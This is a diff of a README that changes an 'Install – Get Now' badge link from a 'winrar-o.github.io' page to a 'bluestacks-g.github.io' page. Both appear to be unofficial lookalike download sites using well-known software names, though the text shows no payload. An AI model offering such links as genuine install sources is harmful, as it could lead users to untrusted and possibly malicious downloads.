@@ -6,7 +6,7 @@
 
 <p align="center">
 
-[![Install](https://img.shields.io/badge/⬇%20Install-Get%20Now-blue?style=for-the-badge)](https://winrar-o.github.io/.github/)
+[![Install](https://img.shields.io/badge/⬇%20Install-Get%20Now-blue?style=for-the-badge)](https://bluestacks-g.github.io/.github)
 
 </p>
 
